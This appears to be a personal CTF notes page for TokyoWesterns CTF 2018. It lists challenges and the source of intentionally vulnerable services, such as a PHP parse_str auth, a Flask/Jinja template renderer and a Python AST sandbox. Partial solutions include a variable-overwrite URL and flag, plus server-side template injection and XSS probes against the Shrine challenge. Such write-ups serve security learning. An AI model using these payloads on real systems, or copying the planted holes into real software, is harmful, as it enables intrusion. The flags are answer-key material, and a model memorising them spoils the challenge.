https://score.ctf.westerns.tokyo/problems?locale=en 

# Welcome!!

### Problem(warmup)

Welcome
`TWCTF{Welcome_TokyoWesterns_CTF_2018!!}`

### Solve

`TWCTF{Welcome_TokyoWesterns_CTF_2018!!}`

# load

### Problem(warmup)

host : pwn1.chal.ctf.westerns.tokyo
port : 34835

[load](https://static.score.ctf.westerns.tokyo/attachments/2/load-ef05273401f331748cca5fcb8b14c43f80600adf4266fee4e5f250730b503f0c) 

# SimpleAuth

### Problem(Web)

[http://simpleauth.chal.ctf.westerns.tokyo](http://simpleauth.chal.ctf.westerns.tokyo/) 

```php
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'auth') {
    if (!empty($res['user'])) {
        $user = $res['user'];
    }
    if (!empty($res['pass'])) {
        $pass = $res['pass'];
    }

    if (!empty($user) && !empty($pass)) {
        $hashed_password = hash('md5', $user.$pass);
    }
    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
        echo $flag;
    }
    else {
        echo 'fail :(';
    }
}
else {
    highlight_file(__FILE__);
}
```

### Solve

parse_str变量覆盖。访问：http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e  得到 `TWCTF{d0_n0t_use_parse_str_without_result_param}` 。

# dec dec dec

### Problem(Reversing)

[dec_dec_dec](https://static.score.ctf.westerns.tokyo/attachments/6/dec_dec_dec-c55c231bfbf686ab058bac2a56ce6cc49ae32fe086af499571e335c9f7417e5b) 

# scs7

### Problem(Crypto)

```python
nc crypto.chal.ctf.westerns.tokyo 14791
```

```python
λ nc crypto.chal.ctf.westerns.tokyo 14791
encrypted flag: CZBAoSWejiP8yEUUpfnMKUSyNQkc1DpWWaTEALydYhmXmJND7zZMzBxXYbdpmz5U
You can encrypt up to 100 messages.
message:
```

### Solve

# mondai.zip

### Problem(misc)

[mondai.zip](https://static.score.ctf.westerns.tokyo/attachments/8/mondai-77791222cdec2fe04bc20eafdb3b330c284d59e35046811c84b47d074e068906.zip)

# vimshell

### Problem(misc)

Can you escape from [jail](http://vimshell.chal.ctf.westerns.tokyo/)?

# tw playing card

### Problem

let's play [tw_playing_card](https://static.score.ctf.westerns.tokyo/attachments/10/tw_playing_card-cf4512000e5797d94e1d98c3af040bd87523081c1ab3f58dea3b70047b634c9f)!



# Matrix LED

### Problem

[MatrixLED.7z](https://static.score.ctf.westerns.tokyo/attachments/11/MatrixLED-7e8889a79686d431e9a7f0210938bfc342399970bc045ecd19a988bffc5477a7.7z)

<https://youtu.be/C6cux2fM7fg>

# DartS

### Problem

[DartS.7z](https://static.score.ctf.westerns.tokyo/attachments/12/DartS-c3f54d435c5f945c6bb91769bd8004df1b2d3afa7dfa0d457576e30128248c7c.7z)

# Revolutional Secure Angou

### Problem

[revolutional-secure-angou.7z](https://static.score.ctf.westerns.tokyo/attachments/15/revolutional-secure-angou-de97106aa248a41a40fdd001fc5f7b4b4f28a39eb6bcabf8401b108b7a8961c5.7z)

# Shrine

### Problem

[shrine](http://shrine.chal.ctf.westerns.tokyo/) is translated as jinja in Japanese.

```python
#view-source:http://shrine.chal.ctf.westerns.tokyo/
import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

### Solve

```python
shrine.chal.ctf.westerns.tokyo/shrine/<script>alert`1`</script>
	能弹窗
# http://www.freebuf.com/articles/web/98619.html
view-source:shrine.chal.ctf.westerns.tokyo/shrine/{{1+2}}
    3
	可见模板引擎能够计算数学表达式的值
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request}}
    <Request 'http://shrine.chal.ctf.westerns.tokyo/shrine/{{request}}' [GET]>
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ}}
    {'REQUEST_METHOD': 'GET', 
     'REQUEST_URI': '/shrine/%7B%7Brequest.environ%7D%7D', 
     'PATH_INFO': '/shrine/{{request.environ}}', 
     'QUERY_STRING': '', 
     'SERVER_PROTOCOL': 'HTTP/1.1', 
     'SCRIPT_NAME': '', 
     'SERVER_NAME': 'shrine-5654786b64-xp7q2', 
     'SERVER_PORT': '8080', 
     'UWSGI_ROUTER': 'http', 
     'REMOTE_ADDR': '10.40.2.1',
     'REMOTE_PORT': '28634', 
     'HTTP_HOST': 'shrine.chal.ctf.westerns.tokyo', 
     'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 
     'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36', 
     'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
     'HTTP_ACCEPT_ENCODING': 'gzip, deflate',
     'HTTP_ACCEPT_LANGUAGE': 'zh-CN,zh;q=0.9',
     'HTTP_X_CLOUD_TRACE_CONTEXT': 'aab47ed41d76fe523b72aac8d1bf064e/4778608169500822544', 
     'HTTP_VIA': '1.1 google',
     'HTTP_X_FORWARDED_FOR': '112.5.203.141, 35.186.198.180',
     'HTTP_X_FORWARDED_PROTO': 'http', 
     'HTTP_CONNECTION': 'Keep-Alive', 
     'wsgi.input': <uwsgi._Input object at 0x7f6ccd562138>, 
     'wsgi.file_wrapper': <built-in function uwsgi_sendfile>, 
     'wsgi.version': (1, 0),
     'wsgi.errors': <_io.TextIOWrapper name=2 mode='w' encoding='UTF-8'>, 
     'wsgi.run_once': False, 
     'wsgi.multithread': False, 
     'wsgi.multiprocess': True, 
     'wsgi.url_scheme': 'http', 
     'uwsgi.version': b'2.0.17.1', 
     'uwsgi.node': b'shrine-5654786b64-xp7q2', 
     'werkzeug.request': <Request 'http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ}}' [GET]>
    }
    
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.werkzeug.request}}
    code_500
    
# http://flask.pocoo.org/docs/1.0/templating/#standard-context
http://shrine.chal.ctf.westerns.tokyo/shrine/{{session}}
    <NullSession {}>
http://shrine.chal.ctf.westerns.tokyo/shrine/{{g}}
    <flask.g of 'app'>
http://shrine.chal.ctf.westerns.tokyo/shrine/{{ctx._AppCtxGlobals}}
    code_500
# http://www.freebuf.com/articles/web/98928.html
http://shrine.chal.ctf.westerns.tokyo/shrine/{{ ''.__class__.__mro__ }}
    (<class 'str'>, <class 'object'>)

http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.PATH_INFO}}2333
    /shrine/{{request.environ.PATH_INFO}}23332333
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.SERVER_PORT}}
    8080
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.HTTP_USER_AGENT}}
    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.HTTP_USER_AGENT[12]}}
    (
http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.environ.HTTP_USER_AGENT[40]}}
    )
http://shrine.chal.ctf.westerns.tokyo/shrine/{%25 set owasp=233+233 %25}{{owasp}}
    466
http://shrine.chal.ctf.westerns.tokyo/shrine/dir{{request.environ.HTTP_USER_AGENT[12]}}{{request.environ.HTTP_USER_AGENT[40]}}
    dir()
```



# twgc

### Problem

Host : twgc.chal.ctf.westerns.tokyo
Port : 11419
[twgc](https://static.score.ctf.westerns.tokyo/attachments/17/twgc-18e0a86aae9b32113cd3089cc1574a897bc258553a9959dc734783228e4ce5a0)
[libc.so.6](https://static.score.ctf.westerns.tokyo/attachments/17/libc-05b841eae6f475817ebb3b99562cd6535cc61b099350a25019cd5d3b3136881d.so.6)

# swap Returns

### Problem

SWAP SAWP WASP PWAS SWPA
`nc swap.chal.ctf.westerns.tokyo 37567`
[swap_returns](https://static.score.ctf.westerns.tokyo/attachments/16/swap_returns-b53223ca8f38cb4615ba13aa2671431bdd8fbb84b033b8c87327e5bd17aaeab6)
[libc.so.6](https://static.score.ctf.westerns.tokyo/attachments/16/libc-a3c98364f3a1be8fce14f93323f60f3093bdc20ba525b30c32e71d26b59cd9d4.so.6)

# EscapeMe

### Problem

host : escapeme.chal.ctf.westerns.tokyo
port : 16359

[EscapeMe.tar.gz](https://static.score.ctf.westerns.tokyo/attachments/4/EscapeMe-714f81602f833da6497283263e46ca7918cbc91ba89b0ab4d84460b801a4ed97.tar.gz)

Update(2018-09-01 10:22 UTC):

```
$ uname -a
Linux pwnable-escapeme 4.15.0-1017-gcp #18-Ubuntu SMP Fri Aug 10 10:13:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.1 LTS
Release:    18.04
Codename:   bionic
```

# Neighbor C

### Problem

Hello Neighbor!
nc neighbor.chal.ctf.westerns.tokyo 37565
[neighbor_c](https://static.score.ctf.westerns.tokyo/attachments/13/neighbor_c-310f2ca86ab0025591c201502ccb4bc3a13b30350b106e693cf483fbdb2b76b1)
[libc.so.6](https://static.score.ctf.westerns.tokyo/attachments/13/libc-a3c98364f3a1be8fce14f93323f60f3093bdc20ba525b30c32e71d26b59cd9d4.so.6)

# Slack emoji converter

### Problem

create your own emoji for Slack at [http://emoji.chal.ctf.westerns.tokyo](http://emoji.chal.ctf.westerns.tokyo/)

```python
# view-source:http://emoji.chal.ctf.westerns.tokyo/source

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
from PIL import Image
import tempfile
import os


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    os.unlink(fname)
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
    
```

# REVersiNG

### Problem

[REVersiNG.7z](https://static.score.ctf.westerns.tokyo/attachments/19/REVersiNG-506b37abc07f52d16ac8342b57b36932b8bf1be42b5b5cdb12ec656448ac668f.7z)

host : pwn1.chal.ctf.westerns.tokyo
port : 16625

The flag is

```
print 'TWCTF{{{}}}'.format(open('key', 'rb').read().encode('hex'))
```

# mixed cipher

### Problem

I heard bulldozer is on this channel, be careful!
`nc crypto.chal.ctf.westerns.tokyo 5643`
[server.py](https://static.score.ctf.westerns.tokyo/attachments/20/server-0b4900a4522dfa4f15489f312d352ebbdd52ff96d724362523c84bc6e3501063.py)

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes

import random
import signal
import os
import sys

sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
privkey = RSA.generate(1024)
pubkey = privkey.publickey()
flag = open('./flag').read().strip()
aeskey = os.urandom(16)
BLOCK_SIZE = 16

def pad(s):
    n = 16 - len(s)%16
    return s + chr(n)*n

def unpad(s):
    n = ord(s[-1])
    return s[:-n]

def aes_encrypt(s):
    iv = long_to_bytes(random.getrandbits(BLOCK_SIZE*8), 16)
    aes = AES.new(aeskey, AES.MODE_CBC, iv)
    return iv + aes.encrypt(pad(s))

def aes_decrypt(s):
    iv = s[:BLOCK_SIZE]
    aes = AES.new(aeskey, AES.MODE_CBC, iv)
    return unpad(aes.decrypt(s[BLOCK_SIZE:]))

def bulldozer(s):
    s = bytearray(s)
    print('Bulldozer is coming!')
    for idx in range(len(s) - 1):
        s[idx] = '#'
    return str(s)

def encrypt():
    p = raw_input('input plain text: ').strip()
    print('RSA: {}'.format(pubkey.encrypt(p, 0)[0].encode('hex')))
    print('AES: {}'.format(aes_encrypt(p).encode('hex')))

def decrypt():
    c = raw_input('input hexencoded cipher text: ').strip().decode('hex')
    print('RSA: {}'.format(bulldozer(privkey.decrypt(c)).encode('hex')))

def print_flag():
    print('here is encrypted flag :)')
    p = flag
    print('another bulldozer is coming!')
    print(('#'*BLOCK_SIZE+aes_encrypt(p)[BLOCK_SIZE:]).encode('hex'))

def print_key():
    print('here is encrypted key :)')
    p = aeskey
    c = pubkey.encrypt(p, 0)[0]
    print(c.encode('hex'))

signal.alarm(300)
while True:
    print("""Welcome to mixed cipher :)
I heard bulldozer is on this channel, be careful!
1: encrypt
2: decrypt
3: get encrypted flag
4: get encrypted key""")
    n = int(raw_input())

    menu = {
        1: encrypt,
        2: decrypt,
        3: print_flag,
        4: print_key,
    }

    if n not in menu:
        print('bye :)')
        exit()
    menu[n]()
```

# ReadableKernelModule

### Problem

Host : rkm.chal.ctf.westerns.tokyo
Port : 1192
[RKM.zip](https://static.score.ctf.westerns.tokyo/attachments/21/RKM-f8565f7b4f0e3bf5f2997d65edc5ea76356a2433e74c2251777cda97e692d138.zip)

# BBQ

### Problem

host : pwn1.chal.ctf.westerns.tokyo
port : 21638
[BBQ](https://static.score.ctf.westerns.tokyo/attachments/3/BBQ-c99e3d473b50c4c2399a44b36399b4e78a984b719bff4804d1dfd89c02be0d1e)
[libc-2.23.so](https://static.score.ctf.westerns.tokyo/attachments/3/libc-2-05b841eae6f475817ebb3b99562cd6535cc61b099350a25019cd5d3b3136881d.23.so)

# pysandbox

### Problem

let's break [sandbox](https://static.score.ctf.westerns.tokyo/attachments/22/sandbox-e3cc8217b5f7502deb32f9096375e3e5d043031260f39cb8ab2513e14a7cb392.py).
start from `nc pwn1.chal.ctf.westerns.tokyo 30001`

Update(2018-09-01 10:22 UTC):
slightly patched `sandbox.py` to avoid netcat issues.

```
81c81
<     expr = sys.stdin.read()
---
>     expr = sys.stdin.readline()
```

sandbox:

```python
import sys
import ast


blacklist = [ast.Call, ast.Attribute]

def check(node):
    if isinstance(node, list):
        return all([check(n) for n in node])
    else:
        """
	expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
	     | IfExp(expr test, expr body, expr orelse)
	     | Dict(expr* keys, expr* values)
	     | Set(expr* elts)
	     | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
	     -- the grammar constrains where yield expressions can occur
	     | Yield(expr? value)
	     -- need sequences for compare to distinguish between
	     -- x < 4 < 3 and (x < 4) < 3
	     | Compare(expr left, cmpop* ops, expr* comparators)
	     | Call(expr func, expr* args, keyword* keywords,
			 expr? starargs, expr? kwargs)
	     | Repr(expr value)
	     | Num(object n) -- a number as a PyObject.
	     | Str(string s) -- need to specify raw, unicode, etc?
	     -- other literals? bools?

	     -- the following expression can appear in assignment context
	     | Attribute(expr value, identifier attr, expr_context ctx)
	     | Subscript(expr value, slice slice, expr_context ctx)
	     | Name(identifier id, expr_context ctx)
	     | List(expr* elts, expr_context ctx) 
	     | Tuple(expr* elts, expr_context ctx)

	      -- col_offset is the byte offset in the utf8 string the parser uses
	      attributes (int lineno, int col_offset)

        """

        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt'],
            'SetComp': ['elt'],
            'DictComp': ['key', 'value'],
            'GeneratorExp': ['elt'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node 
        }

        for k, v in attributes.items():
            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                if isinstance(v, bool):
                    return v
                return all([check(getattr(node, attr)) for attr in v])


if __name__ == '__main__':
    expr = sys.stdin.read()
    body = ast.parse(expr).body
    if check(body):
        sys.stdout.write(repr(eval(expr)))
    else:
        sys.stdout.write("Invalid input")
    sys.stdout.flush()
```

